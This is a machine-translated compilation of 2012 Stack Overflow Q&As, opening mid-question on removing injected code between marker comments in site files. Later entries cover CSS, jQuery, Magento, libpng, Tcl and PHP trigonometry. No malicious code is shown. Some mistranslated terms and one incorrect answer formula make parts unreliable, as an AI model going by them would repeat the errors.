他们添加到我的 php 和 html 文件中的代码略有不同，我如何编写一个 php 脚本来单步执行我的所有站点文件并删除 2 个标签之间的任何文本，例如在上面的代码中，我会删除它介于 / *7e5a0c* / 和 / *7e5a0c* /之间的所有内容

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:12:47.537

我认为你可以让这两个函数变宽：file_get_contents：[http](http://php.net/manual/fr/function.file-get-contents.php) ://php.net/manual/fr/function.file-get-contents.php explode： http: [//php.net/manual/fr/function。爆炸.php](http://php.net/manual/fr/function.explode.php)

就像是 ：

```
$c = file_get_contents('yourfile.php');
$a= explode('/*7e5a0c*/', $c); 
```

您的代码没有“病毒”：

```
$r = $a[0].$a[2] 
```

不确定它是否删除了“/ *7e5a0c* /”，如果是，请尝试：

```
str_replace("/*7e5a0c*/", "", $r); 
```

编辑：文本编辑器（记事本++）搜索功能也可以帮助你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:15:06.857

```
function removeTag($text, $tagStart, $tagEnd) {
    while (($posStart = strpos($text, $tagStart)) !== false) {
        $posEnd = strpos($text, $tagEnd, $posStart + strlen($tagStart));
        if ($posEnd === false) return $text;
        $text = substr($text, 0, $posStart) . substr($text, $posEnd + strlen($tagEnd));
    }
    return $text;
} 
```

但我宁愿建议使用像[clamAV这样的命令行病毒扫描程序来扫描您的文件](http://www.clamav.net/lang/en/)

# html - 之间不需要的垂直空间 标签由 标签

> ID：13530581
> 
> 赞同：0
> 
> 时间：2012-11-23T13:58:48.543
> 
> 标签：html

也许这已经在这里讨论过，但我找不到相关的帖子。所以这是我的问题：

我有一个带有横幅和内容区域的 html 网站。横幅区域在底部有一个边框：

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <title>TEST</title>
    <style type="text/css">
        #banner, #content {
            width: 1000px;
            margin-right: auto;
            margin-left: auto;
        }
        #content {
            background-color: green;
        }
        #banner {
            background-color: red;
            border-bottom: 1px solid rgb(200, 200, 200);
            height: 70px;
        }
    </style>
</head>
<body>
    <div id="banner">
        <h3>Banner</h3>
    </div>
    <div id="content">
        <h3>Content</h3>
    </div>
</body>
</html> 
```

问题是横幅和内容 div 之间的水平空白（我不想要）。

但是，如果我将`border-bottom`横幅 div 移动到`border-top`内容 div 的 a ，空白就会消失，并且所有内容都会按照我的预期呈现。这对我来说似乎很奇怪，但至少在 chrome 和 ie9 之间是一致的（尚未测试其他浏览器）。这种行为的原因是什么？这似乎是由 h3 标签引起的。另请注意，页面高度取决于边框的位置。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T14:01:41.420

它将是 h 元素的边距。这样做`h3{margin:0px;}`应该对差距进行排序:)

编辑 ：

如果差距仍然存在，请尝试在 h 元素上进行填充。或者错误可能与横幅和内容之间的边距有关。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T15:04:01.363

每个浏览器都有自己的 HTML 标签实现。所有 HTML 元素都有自己的边距和填充值，具体取决于浏览器。将边距和填充值中的所有元素重置为“0”是一个很好的做法。那么您的边距和填充样式值会准确反映。

在您的 CSS 开头声明以下内容。

*{ 边距：0px; 填充：0px;}

# syntax-highlighting - 谁发明了语法高亮（以及何时）？

> ID：13530582
> 
> 赞同：5
> 
> 时间：2012-11-23T13:58:55.823
> 
> 标签：syntax-highlighting, history

谁发明了语法高亮（以及何时）？

我尝试在网上搜索，但找不到明确的答案。

维基百科提到了“第一个具有语法突出显示的编辑器是......”

PS。我希望这是这个问题的正确 stackexchange 站点。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T14:13:15.960

我认为这不是解决这个问题的正确 SE 网站。但请参阅此[Wikipedia 文章中有关语法高亮](http://en.wikipedia.org/wiki/Syntax_highlighting)的历史部分。

[我在 1984 年首次在Nixdorf 8870](http://www.8870adventures.com/who-were-nixdorf.html)上使用 Business Basic 时遇到它。

# javascript - “导出”一个使用支流对象的支流示例 - d3.js

> ID：13530584
> 
> 赞同：1
> 
> 时间：2012-11-23T13:59:00.650
> 
> 标签：javascript, json, d3.js

[Tributary](http://tributary.io/)（d3.js 的快速原型设计环境）有一些非常棒的特性。其中之一是支流对象，它使您可以轻松访问数据文件。例如，要在支流中加载 json 文件（example.json），我可以执行以下操作：

```
var example = tributary.example; 
```

我的问题是，我怎样才能将使用支流对象的支流示例“提取”到 HTML 和 Javascript 代码中。例如，我尝试使用此[演示](http://enjalot.com/tributary/3714774/)，将其包装在以下函数中，但找不到成功：

```
 d3.json("costofliving.json", function(col) {
  d3.json("worldcountries.json", function(countries) {
  });
 }); 
```

任何关于如何从加载外部 json 文件的支流演示到 HTML/Javascript 演示的建议将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:22:33.907

将 svg 附加到 dom 以及 width 和 height 属性...此外，使变量 col 和国家/地区可访问 ....我已经尝试了演示，它对我来说效果很好..

# jquery - jQuery (coffeescript) 动态链接

> ID：13530585
> 
> 赞同：0
> 
> 时间：2012-11-23T13:59:04.700
> 
> 标签：jquery, dynamic, coffeescript, bind, unbind

简而言之：

我有一个链接，单击将新 div 插入列表的链接。每个 div 都包含一个删除该 div 的链接。

所以，在工作的过程中，它看起来像这样：

```
<div id="list">
   <div id="item"><a href="#" id="remove_item">Remove</a></div>
   <div id="item"><a href="#" id="remove_item">Remove</a></div>
</div> 
```

至于我有的点击处理程序

```
$("#remove_item").live 'click', (e) ->
    $(this).parent().remove()
    $(this).die()  # Unbind 
```

现在，我的问题是这个处理程序的奇怪行为。如果我点击最后插入的 DIV 的链接，它会被正确删除，但如果我点击第一个 - 除了它被删除之外，它还会删除其中的每一个，恰好站在它**后面**. 因此，单击第一个，基本上会删除所有内容。

而且我只需要删除当前的，显然！:)

而且我不知道为什么解除绑定不起作用。不知道是不是和多次开火有关。:(

有人可以帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:36:07.803

This should be a comment, but not enough points yet.

First of all, consider using [.on()](http://api.jquery.com/on/) and [.off](http://api.jquery.com/off/) as .live() is deprecated.

I can't reproduce your problem, your piece of code works for me here, probably something wrong with multiple binding and unbinding, as you mention. Maybe a little bit more of code would help.

Furthermore, you shouldn't use the same id. IDs should be unique for each element, better have a `class="remove_item"` and a unique id for each div.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T17:25:26.430

DOM 元素的 ID 必须是唯一的。

你很可能只需要改变这个：

```
<div id="list">
   <div id="item"><a href="#" id="remove_item">Remove</a></div>
   <div id="item"><a href="#" id="remove_item">Remove</a></div>
</div> 
```

对此：

```
<div id="list">
   <div class="item"><a href="#" class="remove_item">Remove</a></div>
   <div class="item"><a href="#" class="remove_item">Remove</a></div>
</div> 
```

随着相关的 CoffeeScript 更改为：

```
$(".remove_item").live 'click', (e) ->
    $(this).parent().remove() 
```

另外，我很确定你不需要打电话`$(this).die()`，因为你仍然希望其他 DIV 是可删除的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T07:49:16.247

好的。我不知道问题出在哪里，但是在我重新排列了一些 HTML 布局后，问题就解决了。而且我还是不太明白其中的原因。嗯，随便。感谢所有试图提供帮助的人！:)

# playframework-2.0 - 如何在游戏中使用 swagger？

> ID：13530590
> 
> 赞同：2
> 
> 时间：2012-11-23T13:59:13.700
> 
> 标签：playframework-2.0, swagger

我已经看过[这个](https://github.com/wordnik/swagger-core/blob/master/samples/scala-play2/)示例应用程序，并且我有兴趣在 play 2 应用程序上使用 swagger。所以我在我的 Build.scala 中包含了依赖项，就像那个项目一样：

```
 val appDependencies: Seq[sbt.ModuleID] = Seq(
    "com.wordnik" %% "swagger-play2-utils" % "1.1.1")

  val main = PlayProject(appName, appVersion, appDependencies, mainLang = SCALA).settings(
    resolvers := Seq(
      "Local Maven Repository" at "file://"+Path.userHome.absolutePath+"/.m2/repository",
      Resolver.url("swagger-core-github-repo", url("http://wordnik.github.com/repository"))(Resolver.ivyStylePatterns),
      "sonatype-releases" at "https://oss.sonatype.org/content/repositories/releases",
      "sonatype-snapshots" at "https://oss.sonatype.org/content/repositories/snapshots",
      "java-net" at "http://download.java.net/maven/2",
      "Typesafe Repository" at "http://repo.typesafe.com/typesafe/releases/")) 
```

但它给了我未解决的依赖关系。

我也试过：

```
"com.wordnik" % "swagger-play2-1.1.1" % "1.1.1" 
```

因为我使用 Play 2.1-RC1 但仍然找不到它。

有谁知道我错在哪里（我想我在上面最后一次尝试的时候有一些错误..）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T14:03:18.723

从[Wordnik repo](https://github.com/wordnik/wordnik.github.com/tree/master/repository/com.wordnik/swagger-play2_2.9.1/1.1.1)看来，它应该是：

```
"com.wordnik" % "swagger-play2_2.9.1" % "1.1.1" 
```

但由于该模块是在 Play 2.0.x 上构建的，我不知道它是否适用于 Play 2.1

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-27T05:58:54.237

今天 swagger-core-1.2.0 发布，现在同步到 maven Central。因此，使用最新版本，您现在可以添加以下依赖项，并删除`swagger-core-github-repo`：

```
"com.wordnik" %% "swagger-play2" % "1.2.0" 
```

请注意，当前版本仅为 scala 2.9.1

我们目前正在研究 Play 2.1-RC1。如果您遇到特定问题，您能否在 IRC 中点击#swagger 或在 github 上提交错误消息？

更新

此分支支持 play 2.1：

[https://github.com/wordnik/swagger-core/tree/scala_2.10.0](https://github.com/wordnik/swagger-core/tree/scala_2.10.0)

并且有 sonatype 可供选择：

[https://oss.sonatype.org/content/repositories/snapshots/com/wordnik/swagger-play2_2.10/1.2.1-SNAPSHOT/](https://oss.sonatype.org/content/repositories/snapshots/com/wordnik/swagger-play2_2.10/1.2.1-SNAPSHOT/)

在 play 2.1 退出 rc 后，我们将推送发布版本。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2016-10-07T15:26:34.250

我不确定我是否将帖子放在正确的问题上。我刚刚完成了一个从 Play 2.2.3 迁移到 Play 2.3.10 的项目，在该项目中，我正在努力让 Swagger 1.3.12 与 Play 2.3.10 一起工作，我想分享我的研究并让其他人受益我从这里受益。如果您尝试升级到 swagger **1.3.12**，则必须使用正确版本的反射库，即**0.9.8**，否则将无法正常工作。

原因是 Swagger 1.3.12 会自动引入反射 0.9.9 并且**Play**会驱逐它的旧版本。对我来说，0.9.9 版应该可以很好地与新的 swagger 配合使用，但事实并非如此。经过几轮反复试验，我发现 0.9.8 版本可以正常工作。正如我所说的旧版本将被驱逐，所以你必须强制它，你可以强制版本如下：

```
"org.reflections" % "reflections" % "0.9.8" force() 
```

完成后，我们的项目编译运行成功，Swagger API Doc页面正常显示。更多详情，请访问我的博客[http://jackypig0906.wixsite.com/linghung/single-post/2016/10/06/Migrate-Play-22-to-Play-23](http://jackypig0906.wixsite.com/linghung/single-post/2016/10/06/Migrate-Play-22-to-Play-23)。

# c++ - libpng 错误：读取错误

> ID：13530591
> 
> 赞同：0
> 
> 时间：2012-11-23T13:59:21.063
> 
> 标签：c++, objective-c, ios, png, libpng

我有一些png图像。我打开它。比我保存到文件。当我尝试打开保存的图像时，我遇到了问题。libpng 错误：**读取错误**`png_read_rows`

**下面是编写代码：**

```
png_structp png_ptr = png_create_write_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
png_infop info_ptr = png_create_info_struct(png_ptr);
//created png struct

setjmp(png_jmpbuf(png_ptr))
//signed
png_init_io(png_ptr, file);

png_set_IHDR(png_ptr, info_ptr, width, height, 8, PNG_COLOR_TYPE_RGBA, PNG_INTERLACE_NONE, PNG_COMPRESSION_TYPE_DEFAULT, PNG_FILTER_TYPE_DEFAULT);
//set header
unsigned char * buffer = (unsigned char*)malloc(4 *width * height);
// created buffer
unsigned char ** row_pointers = (unsigned char**) malloc(height * sizeof(unsigned char *)); // created rows pointers
for (int i= 0; i< height ; i++) {
    row_pointers[i] = buffer + i * 4 * width;
}

memset(buffer, 255, 4 * height * width); // fill buffer with white image for example.
// **I mean that the same problem is even when i do not write the opened image, 
//but just fill it with white**.

png_write_image(png_ptr, row_pointers);
//write data

png_write_end(png_ptr, NULL);

png_destroy_write_struct(&png_ptr, (png_infopp)NULL); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-02-18T00:35:26.273

如 libpng/example.c 中所示，将其放在 png_set_IHDR() 之后：

```
// Write the file header information.  REQUIRED

png_write_info(png_ptr, info_ptr); 
```

# asp.net - jquery ajax 调用仅适用于本地主机

> ID：13530598
> 
> 赞同：1
> 
> 时间：2012-11-23T13:59:32.253
> 
> 标签：asp.net, ajax, jquery

我使用 jquery ajax 从 asp.net 后端方法获取数据，如下所示：

```
$.ajax({
    cache: false,
    type: "POST",
    url: '<%= Page.ResolveUrl("~/Live/Live.aspx/GetViews") %>',
    content: "json",
    contentType: "application/json; charset=utf-8",
    data: "{ 'Altid' : '" + GetAltId() + "' }",
    success: function (msg) {
        $("#backEndCount").text(msg.d);
    },
    fail: function (msg) {
        $("#backEndCount").text(msg.d);
    }
}); 
```

和后端方法：

```
[WebMethod]
public static string GetViews(int Altid) 
{
    return Live.count(Altid);
} 
```

此调用在本地工作正常，但在远程服务上，我将页面 html 作为响应而不是正常响应，即“d”。

什么问题，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:02:28.597

您必须检查两个主要事项：

1.  确保服务器支持 asp.net（尝试运行任何 aspx 页面并确保其行为正常）
2.  在线确保路径`'<%= Page.ResolveUrl("~/Live/Live.aspx/GetViews") %>'`正确（尝试完整路径进行测试）

# php - 无法将商品添加到购物车。Magento 1.7

> ID：13530599
> 
> 赞同：1
> 
> 时间：2012-11-23T13:59:34.313
> 
> 标签：php, magento, stack-trace, magento-1.7

我最近将我的 Magento 商店从 1.4.2 升级到 1.7.0.2。现在，当我尝试将产品添加到购物车时，它会显示以下错误：

**无法将商品添加到购物车。**

这是堆栈跟踪：

```
2012-11-23T12:26:33+00:00 DEBUG (7): Exception message: Invalid method Mage_Catalog_Model_Product::prepareCustomOptions(Array
(
)
)
Trace: #0 [internal function]: Varien_Object->__call('prepareCustomOp...', Array)
#1 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Catalog/Model/Product/Type/Abstract.php(357): Mage_Catalog_Model_Product->prepareCustomOptions()
#2 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Catalog/Model/Product/Type/Grouped.php(294): Mage_Catalog_Model_Product_Type_Abstract->_prepareProduct(Object(Varien_Object), Object(Mage_Catalog_Model_Product), 'full')
#3 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Catalog/Model/Product/Type/Abstract.php(410): Mage_Catalog_Model_Product_Type_Grouped->_prepareProduct(Object(Varien_Object), Object(Mage_Catalog_Model_Product), 'full')
#4 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Sales/Model/Quote.php(901): Mage_Catalog_Model_Product_Type_Abstract->prepareForCartAdvanced(Object(Varien_Object), Object(Mage_Catalog_Model_Product), 'full')
#5 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Sales/Model/Quote.php(978): Mage_Sales_Model_Quote->addProductAdvanced(Object(Mage_Catalog_Model_Product), Object(Varien_Object), 'full')
#6 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Checkout/Model/Cart.php(271): Mage_Sales_Model_Quote->addProduct(Object(Mage_Catalog_Model_Product), Object(Varien_Object))
#7 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Checkout/controllers/CartController.php(193): Mage_Checkout_Model_Cart->addProduct(Object(Mage_Catalog_Model_Product), Array)
#8 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Core/Controller/Varien/Action.php(419): Mage_Checkout_CartController->addAction()
#9 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Core/Controller/Varien/Router/Standard.php(250): Mage_Core_Controller_Varien_Action->dispatch('add')
#10 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/local/MW/Developertoolbar/Controller/Router/Standard.php(42): Mage_Core_Controller_Varien_Router_Standard->match(Object(Mage_Core_Controller_Request_Http))
#11 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Core/Controller/Varien/Front.php(176): MW_Developertoolbar_Controller_Router_Standard->match(Object(Mage_Core_Controller_Request_Http))
#12 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Core/Model/App.php(354): Mage_Core_Controller_Varien_Front->dispatch()
#13 /var/www/vhosts/medicalemcasa.com/httpdocs/app/Mage.php(683): Mage_Core_Model_App->run(Array)
#14 /var/www/vhosts/medicalemcasa.com/httpdocs/index.php(87): Mage::run('', 'store')
#15 {main}
2012-11-23T12:26:33+00:00 ERR (3): 
exception 'Varien_Exception' with message 'Invalid method Mage_Catalog_Model_Product::prepareCustomOptions(Array
(
)
)' in /var/www/vhosts/medicalemcasa.com/httpdocs/lib/Varien/Object.php:652
Stack trace:
#0 [internal function]: Varien_Object->__call('prepareCustomOp...', Array)
#1 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Catalog/Model/Product/Type/Abstract.php(357): Mage_Catalog_Model_Product->prepareCustomOptions()
#2 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Catalog/Model/Product/Type/Grouped.php(294): Mage_Catalog_Model_Product_Type_Abstract->_prepareProduct(Object(Varien_Object), Object(Mage_Catalog_Model_Product), 'full')
#3 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Catalog/Model/Product/Type/Abstract.php(410): Mage_Catalog_Model_Product_Type_Grouped->_prepareProduct(Object(Varien_Object), Object(Mage_Catalog_Model_Product), 'full')
#4 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Sales/Model/Quote.php(901): Mage_Catalog_Model_Product_Type_Abstract->prepareForCartAdvanced(Object(Varien_Object), Object(Mage_Catalog_Model_Product), 'full')
#5 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Sales/Model/Quote.php(978): Mage_Sales_Model_Quote->addProductAdvanced(Object(Mage_Catalog_Model_Product), Object(Varien_Object), 'full')
#6 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Checkout/Model/Cart.php(271): Mage_Sales_Model_Quote->addProduct(Object(Mage_Catalog_Model_Product), Object(Varien_Object))
#7 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Checkout/controllers/CartController.php(193): Mage_Checkout_Model_Cart->addProduct(Object(Mage_Catalog_Model_Product), Array)
#8 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Core/Controller/Varien/Action.php(419): Mage_Checkout_CartController->addAction()
#9 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Core/Controller/Varien/Router/Standard.php(250): Mage_Core_Controller_Varien_Action->dispatch('add')
#10 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/local/MW/Developertoolbar/Controller/Router/Standard.php(42): Mage_Core_Controller_Varien_Router_Standard->match(Object(Mage_Core_Controller_Request_Http))
#11 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Core/Controller/Varien/Front.php(176): MW_Developertoolbar_Controller_Router_Standard->match(Object(Mage_Core_Controller_Request_Http))
#12 /var/www/vhosts/medicalemcasa.com/httpdocs/app/code/core/Mage/Core/Model/App.php(354): Mage_Core_Controller_Varien_Front->dispatch()
#13 /var/www/vhosts/medicalemcasa.com/httpdocs/app/Mage.php(683): Mage_Core_Model_App->run(Array)
#14 /var/www/vhosts/medicalemcasa.com/httpdocs/index.php(87): Mage::run('', 'store')
#15 {main} 
```

如果有帮助，我正在尝试将简单的产品添加到购物车中。

知道发生了什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-07-20T08:16:39.073

检查您的代码中是否有任何观察者，或者您添加的新扩展是否会在您将项目添加到卡片时触发，请找到我修复的以下代码以解决问题

原来的：

```
$item = $observer->getEvent()->getQuoteItem();
$product = $item->getProduct();
$item->setMerchant($product->getMethant());
$item->save(); 
```

解决方案：

```
$quoteItem = $observer->getQuoteItem();
$product = $observer->getProduct();
$quoteItem->setCustomAttribute($product->getCustomAttribute()); 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-12-03T12:11:11.840

好的，我试图了解引发该错误的原因，但无济于事。

所以我通过安装全新安装的 Magento 1.7 解决了这个问题，并从那里升级了我的 magento 商店。

# android - android - 如何为 listadaptor 设置样式

> ID：13530600
> 
> 赞同：0
> 
> 时间：2012-11-23T13:59:34.020
> 
> 标签：android, listadapter

我正在使用 ListAdapter 。当我运行模拟器时，项目的字体大小非常大，我想更改字体大小。我搜索了很多，但我做不了太多。这是代码：

```
String items[]={"a","b","c"}; 
```

Positions.this.setListAdapter(new ArrayAdapter(Positions.this,android.R.layout.simple_list_item_1,items));

我怎样才能改变这个的字体大小？顺便问一下，列表有什么字体吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T14:16:20.727

您需要为此使用自定义列表适配器

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:18:12.050

这是自定义列表视图的链接。在其中，只需`android:textSize="22dp"`将 textview 中的行更改为`listview_item_row.xml`您想要的任何大小

[http://www.ezzylearning.com/tutorial.aspx?tid=1763429](http://www.ezzylearning.com/tutorial.aspx?tid=1763429)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:18:16.403

像这样定义你的 ArrayAdapter：

```
 new ArrayAdapter(Positions.this,android.R.layout.simple_list_item_1,items){
        @Override
        public View getView(int position, View convertView, ViewGroup parent) {
            View superView = super.getView(position, convertView, parent);
            int textSize = 5;
            ((TextView)superView.findViewById(android.R.id.text1)).setTextSize(TypedValue.COMPLEX_UNIT_DIP, textSize);
            return superView;
        }
    }; 
```

# string - 剥离一个字符串，直到出现一个或多个字符

> ID：13530603
> 
> 赞同：0
> 
> 时间：2012-11-23T13:59:45.200
> 
> 标签：string, tcl

我对 TCL 不太熟练，因此请求帮助以提供所需的机制来实现以下输出：

假设我有一个字符串，其值为*“他提供食物（现成冰淇淋）；”*

我希望这个主字符串中的子字符串为“*现成的冰淇淋）；* ”

进一步是否可以进一步剥离主字符串以获得子字符串作为“*现成的冰淇淋*”

这是我的尝试，但它不起作用：

```
string trim $str "(" 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T14:12:12.483

这是正则表达式是正确使用的情况：

```
if {[regexp {\(([^()]*)\)} $str -> substring]} {
    puts "found $substring in parentheses"
} else {
    puts "did not find anything suitable"
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T16:10:37.663

从左侧修剪：

```
 set ix [string first ( $s]
 if {$ix >= 0} {
     incr ix
     set s [string range $s $ix end]
 }
 # else the string does not contain '(' 
```

从右侧修剪：

```
 set ix [string last ) $s]
 if {$ix >= 0} {
     incr ix -1
     set s [string range $s 0 $ix]
 }
 # else the string does not contain ')' 
```

有关更多信息，请参阅[手册](http://www.tcl.tk/man/tcl8.5/TclCmd/string.htm) [页](http://www.tcl.tk/man/tcl8.5/TclCmd/incr.htm)。

# web-services - 是否可以更改 AX 2012 AIF WebService 的目标名称？

> ID：13530607
> 
> 赞同：1
> 
> 时间：2012-11-23T13:59:51.157
> 
> 标签：web-services, axapta, dynamics-ax-2012, ax, aif

如果我创建 AIF-WebService（自定义或文档），则 targetNamespace 设置为“http://tempuri.org/”。有可能改变吗？

我在 AOT 的服务节点中设置了属性“命名空间”，并在服务配置中设置了服务->服务名称->端点->默认服务组端点中的绑定命名空间，但这并没有改变目标命名空间。

而且我不知道这是否重要，我们使用 IIS 作为网络服务器。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T14:43:28.037

您可以通过执行以下两个步骤轻松更改服务命名空间：

1.  更改 AOT 中服务节点中的“命名空间”属性。
2.  通过转到 AifService 表单并按“刷新”按钮来促进对 WCF 的更改。

稍等片刻，你会看到变化已经取而代之。

根据[这篇文章](http://technet.microsoft.com/en-us/library/dd309574%28v=ax.50%29.aspx)：

> 如果对服务进行任何更改，或者在 AOT 中添加自定义服务，则必须刷新服务以使这些更改反映在 AIF 中。

![在此处输入图像描述](../Images/39d05a803b7a58bb74796e47669121b1.png)

# css - Modernizr 在 Chrome 和 FF 中将笔记本电脑报告为触摸设备

> ID：13530612
> 
> 赞同：9
> 
> 时间：2012-11-23T14:00:18.590
> 
> 标签：css, firefox, google-chrome, touch, modernizr

有点奇怪。我有一个正在开发的网站。但是，在我的笔记本电脑（华硕 Zenbook）上，某些功能不起作用。我们花了很多时间使用 Firebug 来尝试让它工作/弄清楚它是什么，但没有任何乐趣！

然后我注意到这些功能实际上是使用 :hover 类在 CSS 中创建的，但也通过包含类“.no-touch”来禁用触摸设备。

然后，我查看了 Modernizr 添加到 HTML 标记中的类，并且“.touch”已与标准一起添加。

看来，Modernizr 正在将我的 Firefox 和 Chrome 中的笔记本电脑视为触摸设备。

显然，当网站上线时，这可能是一个问题，因为某些功能不适用于使用 Zenbook 和任何其他以相同方式运行的设备的人。

有没有人见过这样的事情？也许与其他“非触摸”设备一起使用？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-26T19:08:27.287

不幸的是，Modernizr 测试了浏览器中对*触摸事件*的支持，因此它不是对触摸设备的适当测试。Chrome 和 Firefox 的最新版本支持此功能。

您可以在这里查看问题： [https ://github.com/Modernizr/Modernizr/issues/548](https://github.com/Modernizr/Modernizr/issues/548)

我也在寻找关于这个问题的一个好的解决方案，但我唯一发现的是这个，虽然我还没有测试过：[https ://stackoverflow.com/a/4819886/1262357](https://stackoverflow.com/a/4819886/1262357)

如果你有好的结果，请告诉我！

# jquery - jQuery UI 可排序：获取防止 DOM 更改的新项目位置

> ID：13530613
> 
> 赞同：2
> 
> 时间：2012-11-23T14:00:18.663
> 
> 标签：jquery, jquery-ui, jquery-ui-sortable

我的页面上有一个可排序的列表。我只想知道用户的意图：他拖动什么项目以及在哪里，即拖动元素的新旧（潜在）位置。

但我不想让 jQuery-sortable 真正改变我的 DOM——我想自己做。这是示例：

```
$(".sortable-list").sortable({
  items: ".sortable-item",
  stop: function (event, ui) {
    // prevent DOM changes
    $(this).sortable('cancel');
    // get the indices
    var oldIndex = $(this).find('.sortable-item').index(ui.item);
    var newIndex = 'how?'; // this is the question
  }
}); 
```

`ui.originalPosition`我知道我可以使用and计算新位置`ui.position`，但我相信 jQuery-sortable 已经完成了这项工作，因为它将占位符放在一个有效的位置，所以我只想得到这个值。

我怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T14:00:18.663

好吧，当我写一个问题时，我实际上已经找到了解决方案。

事实证明，jQuery-sortable 在我调用`$(this).sortable('cancel')`. 这个调用实际上做的是*恢复*插件所做的更改。

这是工作代码：

```
$(".sortable-list").sortable({
  items: ".sortable-item",
  stop: function (event, ui) {
    var newIndex = $(this).find('.sortable-item').index(ui.item);
    $(this).sortable('cancel');  // revert changes
    var oldIndex = $(this).find('.sortable-item').index(ui.item);
  }
}); 
```

# php - php如何获取圆上几个点的坐标

> ID：13530617
> 
> 赞同：1
> 
> 时间：2012-11-23T14:00:28.990
> 
> 标签：php

我有几点。我需要将这些点放在一个圆圈上并获取它们的坐标。

```
function positionX($numItems,$thisNum){ 
  $alpha = 360/$numItems; // angle between the elements
  $r = 1000; // radius
  $angle = $alpha * $thisNum; // angle for N element
  $x = $r * cos($angle); // X coordinates
  return $x;
}

function positionY($numItems,$thisNum){ 
  $alpha = 360/$numItems; // angle between the elements
  $r = 1000; // radius
  $angle = $alpha * $thisNum; // angle for N element
  $y = $r * sin($angle); // Y coordinates
  return $y;
} 
```

但是我的代码不起作用..这些函数会产生奇怪的坐标。

图片示例：[http ://cl.ly/image/453E2w1Y0w0d](http://cl.ly/image/453E2w1Y0w0d)

**升级版：**

```
echo positionX(4,1)."<br>";
echo positionY(4,1)."<br><br>";

echo positionX(4,2)."<br>";
echo positionY(4,2)."<br><br>";

echo positionX(4,3)."<br>";
echo positionY(4,3)."<br><br>";

echo positionX(4,4)."<br>";
echo positionY(4,4)."<br><br>"; 
```

4 - 所有元素；1,2,3,4 - 元素数。

这些代码给了我结果：

```
-448.073616129
893.996663601

-598.460069058
0

984.381950633
-176.045946471

-283.691091487
958.915723414 
```

在圈子上它不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:05:38.253

那是因为您没有在 sin() 和 cos() 函数中使用辐射。你需要把天使变成光芒四射。看看 sin() 的[函数描述](http://php.net/manual/en/function.sin.php)，你会发现 arg 是在 radiants 中。

提醒

```
1° = 2 PI / 360; 
```

**编辑**

我似乎在你的代码中找不到错误，试试这个

```
function($radius, $points, $pointToFind) {

 $angle = 360 / $points * 2 * pi(); //angle in radiants

 $x = $radius * cos($angle * $pointToFind);
 $y = $radius * sin($angle * $pointToFind);

} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T14:05:41.593

cos() 和 sin() 函数需要以弧度而不是度数为单位的参数。

使用[deg2rad()](http://www.php.net/manual/en/function.deg2rad.php)函数进行转换

**编辑**

代码：

```
function positionX($numItems,$thisNum){
  $alpha = 360/$numItems; // angle between the elements
  $r = 1000; // radius
  $angle = $alpha * $thisNum; // angle for N element
  $x = $r * cos(deg2rad($angle)); // X coordinates
  return $x;
}

function positionY($numItems,$thisNum){
  $alpha = 360/$numItems; // angle between the elements
  $r = 1000; // radius
  $angle = $alpha * $thisNum; // angle for N element
